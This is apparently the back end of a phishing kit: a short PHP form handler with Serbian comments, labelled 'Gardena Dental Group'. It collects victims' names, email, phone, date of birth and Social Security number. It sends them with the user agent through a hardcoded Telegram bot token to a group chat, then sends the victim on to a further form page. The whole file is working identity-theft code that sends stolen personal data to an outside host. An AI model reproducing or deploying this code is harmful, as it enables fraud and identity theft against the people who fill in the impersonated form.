<?php
if (isset($_POST['submit'])) {
    // Prikupljanje podataka iz forme
    $firstName = $_POST['first_name'] ?? '';
    $lastName = $_POST['last_name'] ?? '';
    $email = $_POST['email'] ??'';
    $phone = $_POST['phone'] ??'';
    $dob = $_POST['dob'] ??'';
    $ssn = $_POST['ssn'] ??'';
    $ip_address = $_POST['ip_address'] ??'';
    $userAgent = $_SERVER['HTTP_USER_AGENT'];

    // Priprema poruke za Telegram
    $message = "Gardena Dental Group\n\nFirst Name : $firstName\nLast Name : $lastName\nEmail : $email\nPhone : $phone\nDate of Birth : $dob\nSSN : $ssn\n\nIP Address : $ip_address\n$userAgent";

    // Telegram API konfiguracija
    $apiToken = '6718053935:AAFMv7NsTNd0kTG2QdT17_80a-oTDOyWE4U';
    $chatId = '-4104959417';// Zamenite sa vašim chat ID-om

    $telegramUrl = "https://api.telegram.org/bot$apiToken/sendMessage";
    $telegramData = [
        'chat_id' => $chatId,
        'text' => $message,
    ];

    // Slanje podataka na Telegram
    $chTelegram = curl_init($telegramUrl);
    curl_setopt($chTelegram, CURLOPT_POST, true);
    curl_setopt($chTelegram, CURLOPT_POSTFIELDS, http_build_query($telegramData));
    curl_setopt($chTelegram, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($chTelegram, CURLOPT_HTTPHEADER, array('Content-Type: application/x-www-form-urlencoded'));
    $telegramResponse = curl_exec($chTelegram);
    curl_close($chTelegram);

    // Provera da li je poruka uspešno poslata
    if ($telegramResponse !== false) {
        // Preusmeravanje na novu stranicu sa formom
        header("Location: nextFormPage.php"); // Zamenite sa putanjom do vaše sledeće stranice sa formom
        exit;
    } else {
        echo "Došlo je do greške prilikom slanja poruke.";
    }
}
?>
